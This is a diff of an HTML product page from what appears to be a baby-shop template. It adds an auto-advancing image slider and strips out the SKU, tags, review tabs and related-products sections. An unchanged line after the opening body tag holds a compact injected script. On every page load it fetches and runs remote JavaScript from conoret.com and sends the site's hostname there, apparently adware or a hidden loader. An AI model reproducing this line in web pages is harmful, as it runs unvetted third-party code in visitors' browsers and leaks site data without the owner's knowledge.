@@ -17,6 +17,43 @@
     <link rel="preconnect" href="https://fonts.googleapis.com/">
     <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
     <link href="./product_files/css2" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        .slider-container {
+            position: relative;
+            max-width: 100%;
+            margin: auto;
+        }
+        .slides {
+            display: none;
+            width: 100%;
+        }
+        img {
+            width: 100%;
+        }
+        .prev, .next {
+            cursor: pointer;
+            position: absolute;
+            top: 50%;
+            width: auto;
+            padding: 16px;
+            margin-top: -22px;
+            color: white;
+            font-weight: bold;
+            font-size: 18px;
+            transition: 0.6s ease;
+            border-radius: 0 3px 3px 0;
+            user-select: none;
+        }
+        .next {
+            right: 0;
+            border-radius: 3px 0 0 3px;
+        }
+    </style>
+
     <!-- script
     ================================================== -->
     <script src="./product_files/modernizr.js"></script>
@@ -35,6 +72,8 @@
             $("#commonFooterBottom").load("footer-bottom.html");
           });
     </script>
+
+
 
   </head>
   <body data-bs-spy="scroll" data-bs-target="#navbar" data-bs-root-margin="0px 0px -40%" data-bs-smooth-scroll="true" tabindex="0"><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
@@ -202,7 +241,11 @@
         <div class="row justify-content-center">
           <div class="col-lg-6 col-md-10">
             <div class="product-preview mb-3">
-              <img src="./product_files/singel-product-item.jpg" alt="single-product" class="img-fluid">
+                <div class="slider-container">
+                    <div id="imageSlider"></div>
+                    <a class="prev" onclick="changeSlide(-1)">&#10094;</a>
+                    <a class="next" onclick="changeSlide(1)">&#10095;</a>
+                </div>
             </div>
           </div>
           <div class="col-lg-6 col-md-8">
@@ -266,12 +309,6 @@
               </div>
               <div class="meta-product mt-3">
                 <div class="meta-item d-flex align-items-baseline">
-                  <h4 class="fs-4 text-dark pe-2">SKU:</h4>
-                  <ul class="select-list list-unstyled d-flex">
-                    <li data-value="S" class="select-item">1223</li>
-                  </ul>
-                </div>
-                <div class="meta-item d-flex align-items-baseline">
                   <h4 class="fs-4 text-dark pe-2">Category:</h4>
                   <ul class="select-list list-unstyled d-flex">
                     <li data-value="S" class="select-item pe-2">
@@ -284,230 +321,6 @@
                       <a href="https://longlinht.github.io/baby/single-product.html#">Orange</a>
                     </li>
                   </ul>
-                </div>
-                <div class="meta-item d-flex align-items-baseline">
-                  <h4 class="fs-4 text-dark pe-2">Tags:</h4>
-                  <ul class="select-list list-unstyled d-flex">
-                    <li data-value="S" class="select-item pe-2">
-                      <a href="https://longlinht.github.io/baby/single-product.html#">Classic</a>,
-                    </li>
-                    <li data-value="S" class="select-item pe-2">
-                      <a href="https://longlinht.github.io/baby/single-product.html#">Winter</a>,
-                    </li>
-                    <li data-value="S" class="select-item">
-                      <a href="https://longlinht.github.io/baby/single-product.html#">Modern</a>
-                    </li>
-                  </ul>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-    <section class="product-tabs">
-      <div class="container-lg">
-        <div class="row">
-          <div class="tabs-listing">
-            <nav>
-              <div class="nav nav-tabs d-flex flex-wrap justify-content-center border-0" id="nav-tab" role="tablist">
-                <button class="nav-link active text-capitalize text-dark fs-4" id="nav-home-tab" data-bs-toggle="tab" data-bs-target="#nav-home" type="button" role="tab" aria-controls="nav-home" aria-selected="true">Description</button>
-                <button class="nav-link text-capitalize text-dark fs-4" id="nav-information-tab" data-bs-toggle="tab" data-bs-target="#nav-information" type="button" role="tab" aria-controls="nav-information" aria-selected="false" tabindex="-1">Additional information</button>
-                <button class="nav-link text-capitalize text-dark fs-4" id="nav-review-tab" data-bs-toggle="tab" data-bs-target="#nav-review" type="button" role="tab" aria-controls="nav-review" aria-selected="false" tabindex="-1">Reviews</button>
-              </div>
-            </nav>
-            <div class="tab-content bg-light" id="nav-tabContent">
-              <div class="tab-pane fade show active border-top p-5 border" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab">
-                <p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec odio. Quisque volutpat mattis eros. Nullam malesuada erat ut turpis. Suspendisse urna viverra non, semper suscipit, posuere a, pede. Donec nec justo eget felis facilisis fermentum. Aliquam porttitor mauris sit amet orci. Aenean dignissim pellentesque felis. Phasellus ultrices nulla quis nibh. Quisque a lectus. Donec consectetuer ligula vulputate sem tristique cursus.</p>
-                <ul style="list-style-type:disc;" class="list-unstyled">
-                  <li>Donec nec justo eget felis facilisis fermentum.</li>
-                  <li>Suspendisse urna viverra non, semper suscipit pede.</li>
-                  <li>Aliquam porttitor mauris sit amet orci.</li>
-                </ul>
-                <p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec odio. Quisque volutpat mattis eros. Nullam malesuada erat ut turpis. Suspendisse urna viverra non, semper suscipit, posuere a, pede. Donec nec justo eget felis facilisis fermentum. Aliquam porttitor mauris sit amet orci. Aenean dignissim pellentesque felis. Phasellus ultrices nulla quis nibh. Quisque a lectus. Donec consectetuer ligula vulputate sem tristique cursus. </p>
-              </div>
-              <div class="tab-pane fade border-top p-5 border" id="nav-information" role="tabpanel" aria-labelledby="nav-information-tab">
-                <p>
-                  <strong>It is Comfortable and Best</strong>
-                </p>
-                <p>Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
-              </div>
-              <div class="tab-pane fade border-top p-5 border" id="nav-review" role="tabpanel" aria-labelledby="nav-review-tab">
-                <div class="row">
-                  <div class="col-lg-6 col-md-6">
-                    <div class="row">
-                      <div class="col-md-3">
-                        <div class="image-holder">
-                          <img src="./product_files/review-item1.jpg" alt="review" class="img-fluid">
-                        </div>
-                      </div>
-                      <div class="col-md-7">
-                        <div class="review-content">
-                          <div class="rating-container d-flex align-items-center">
-                            <div class="rating" data-rating="1" onclick="rate(1)">
-                              <svg class="star-fill" width="18" height="18">
-                                <use xlink:href="#star-fill"></use>
-                              </svg>
-                            </div>
-                            <div class="rating" data-rating="2" onclick="rate(1)">
-                              <svg class="star-fill" width="18" height="18">
-                                <use xlink:href="#star-fill"></use>
-                              </svg>
-                            </div>
-                            <div class="rating" data-rating="3" onclick="rate(1)">
-                              <svg class="star-fill" width="18" height="18">
-                                <use xlink:href="#star-fill"></use>
-                              </svg>
-                            </div>
-                            <div class="rating" data-rating="4" onclick="rate(1)">
-                              <svg class="star-fill" width="18" height="18">
-                                <use xlink:href="#star-fill"></use>
-                              </svg>
-                            </div>
-                            <div class="rating" data-rating="5" onclick="rate(1)">
-                              <svg class="star-fill" width="18" height="18">
-                                <use xlink:href="#star-fill"></use>
-                              </svg>
-                            </div>
-                            <span class="rating-count">(5)</span>
-                          </div>
-                          <div class="review-header">
-                            <span class="author-name">Tina Johnson</span>
-                            <span class="review-date">– 03/07/2023</span>
-                          </div>
-                          <p>Vitae tortor condimentum lacinia quis vel eros donec ac. Nam at lectus urna duis convallis convallis</p>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-                  <div class="col-lg-6 col-md-6">
-                    <div class="row">
-                      <div class="col-md-3">
-                        <div class="image-holder">
-                          <img src="./product_files/review-item2.jpg" alt="review" class="img-fluid">
-                        </div>
-                      </div>
-                      <div class="col-md-7">
-                        <div class="review-content">
-                          <div class="rating-container d-flex align-items-center">
-                            <div class="rating" data-rating="1" onclick="rate(1)">
-                              <svg class="star-fill" width="18" height="18">
-                                <use xlink:href="#star-fill"></use>
-                              </svg>
-                            </div>
-                            <div class="rating" data-rating="2" onclick="rate(1)">
-                              <svg class="star-fill" width="18" height="18">
-                                <use xlink:href="#star-fill"></use>
-                              </svg>
-                            </div>
-                            <div class="rating" data-rating="3" onclick="rate(1)">
-                              <svg class="star-fill" width="18" height="18">
-                                <use xlink:href="#star-fill"></use>
-                              </svg>
-                            </div>
-                            <div class="rating" data-rating="4" onclick="rate(1)">
-                              <svg class="star-fill" width="18" height="18">
-                                <use xlink:href="#star-fill"></use>
-                              </svg>
-                            </div>
-                            <div class="rating" data-rating="5" onclick="rate(1)">
-                              <svg class="star-fill" width="18" height="18">
-                                <use xlink:href="#star-empty"></use>
-                              </svg>
-                            </div>
-                            <span class="rating-count">(4)</span>
-                          </div>
-                          <div class="review-header">
-                            <span class="author-name">Jenny Willis</span>
-                            <span class="review-date">– 03/06/2022</span>
-                          </div>
-                          <p>Vitae tortor condimentum lacinia quis vel eros donec ac. Nam at lectus urna duis convallis convallis</p>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-    <section id="featured-product" class="py-lg-11 position-relative">
-      <div class="container-lg">
-        <div class="row">
-          <div class="display-header text-center position-relative">
-            <h2 class="display-2">Related Products</h2>
-            <div class="icon-overlay position-absolute">
-              <img src="./product_files/star-icon-overlay.png" alt="icon overlay">
-            </div>
-          </div>
-          <div class="row">
-            <div class="col-lg-3 col-md-6 col-sm-6 mb-4">
-              <div class="product-item">
-                <div class="image-holder text-center p-3 mb-4 border rounded-4">
-                  <img src="./product_files/product-item1.png" alt="toy" class="img-fluid">
-                </div>
-                <div class="product-info ps-2">
-                  <h3 class="m-0">
-                    <a href="https://longlinht.github.io/baby/single-product.html" class="text-secondary">Cotton Outlay</a>
-                  </h3>
-                  <div class="product-price text-primary">$320.00</div>
-                  <a href="https://longlinht.github.io/baby/cart.html" class="btn btn-outline-gray text-capitalize rounded-pill mt-4 btn-sm" data-bs-toggle="offcanvas" data-bs-target="#offcanvasCart" aria-controls="offcanvasCart">Add to cart <svg class="cart" width="18" height="18">
-                      <use xlink:href="#cart"></use>
-                    </svg>
-                  </a>
-                </div>
-              </div>
-            </div>
-            <div class="col-lg-3 col-md-6 col-sm-6 mb-4">
-              <div class="product-item">
-                <div class="image-holder text-center p-3 mb-4 border rounded-4">
-                  <img src="./product_files/product-item2.png" alt="toy" class="img-fluid">
-                </div>
-                <div class="product-info ps-2">
-                  <h3 class="m-0">
-                    <a href="https://longlinht.github.io/baby/single-product.html" class="text-secondary">Woollen Pattern</a>
-                  </h3>
-                  <div class="product-price text-primary">$320.00</div>
-                  <a href="https://longlinht.github.io/baby/cart.html" class="btn btn-outline-gray text-capitalize rounded-pill mt-4 btn-sm" data-bs-toggle="offcanvas" data-bs-target="#offcanvasCart" aria-controls="offcanvasCart">Add to cart <svg class="cart" width="18" height="18">
-                      <use xlink:href="#cart"></use>
-                    </svg>
-                  </a>
-                </div>
-              </div>
-            </div>
-            <div class="col-lg-3 col-md-6 col-sm-6 mb-4">
-              <div class="product-item">
-                <div class="image-holder text-center p-3 mb-4 border rounded-4">
-                  <img src="./product_files/product-item3.png" alt="toy" class="img-fluid">
-                </div>
-                <div class="product-info ps-2">
-                  <h3 class="m-0">
-                    <a href="https://longlinht.github.io/baby/single-product.html" class="text-secondary">Casual Rabbit</a>
-                  </h3>
-                  <div class="product-price text-primary">$320.00</div>
-                  <a href="https://longlinht.github.io/baby/cart.html" class="btn btn-outline-gray text-capitalize rounded-pill mt-4 btn-sm" data-bs-toggle="offcanvas" data-bs-target="#offcanvasCart" aria-controls="offcanvasCart">Add to cart <svg class="cart" width="18" height="18">
-                      <use xlink:href="#cart"></use>
-                    </svg>
-                  </a>
-                </div>
-              </div>
-            </div>
-            <div class="col-lg-3 col-md-6 col-sm-6 mb-4">
-              <div class="product-item">
-                <div class="image-holder text-center p-3 mb-4 border rounded-4">
-                  <img src="./product_files/product-item4.png" alt="toy" class="img-fluid">
-                </div>
-                <div class="product-info ps-2">
-                  <h3 class="m-0">
-                    <a href="https://longlinht.github.io/baby/single-product.html" class="text-secondary">Uffy Unicorn</a>
-                  </h3>
-                  <div class="product-price text-primary">$320.00</div>
-                  <a href="https://longlinht.github.io/baby/cart.html" class="btn btn-outline-gray text-capitalize rounded-pill mt-4 btn-sm" data-bs-toggle="offcanvas" data-bs-target="#offcanvasCart" aria-controls="offcanvasCart">Add to cart <svg class="cart" width="18" height="18">
-                      <use xlink:href="#cart"></use>
-                    </svg>
-                  </a>
                 </div>
               </div>
             </div>
@@ -523,5 +336,39 @@
     <script type="text/javascript" src="./product_files/bootstrap.bundle.min.js"></script>
     <script type="text/javascript" src="./product_files/plugins.js"></script>
     <script type="text/javascript" src="./product_files/script.js"></script>
+
+    <script>
+      // List of image URLs
+      const images = [
+          './product_files/singel-product-item.jpg',
+          './product_files/singel-product-item.jpg',
+          './product_files/singel-product-item.jpg',
+          './product_files/singel-product-item.jpg'
+      ];
+
+      // Dynamically load images into the slider
+      const sliderContainer = document.getElementById('imageSlider');
+      images.forEach((imgSrc, index) => {
+          const imgElement = document.createElement('img');
+          imgElement.src = imgSrc;
+          imgElement.classList.add('slides');
+          imgElement.style.display = index === 0 ? 'block' : 'none'; // Show first image
+          sliderContainer.appendChild(imgElement);
+      });
+
+      let currentSlide = 0;
+
+      function changeSlide(n) {
+          const slides = document.getElementsByClassName('slides');
+          slides[currentSlide].style.display = 'none';
+          currentSlide = (currentSlide + n + slides.length) % slides.length; // Loop around
+          slides[currentSlide].style.display = 'block';
+      }
+
+      // Auto slide every 3 seconds
+      setInterval(() => {
+          changeSlide(1);
+      }, 3000);
+    </script>
   
 </body></html>
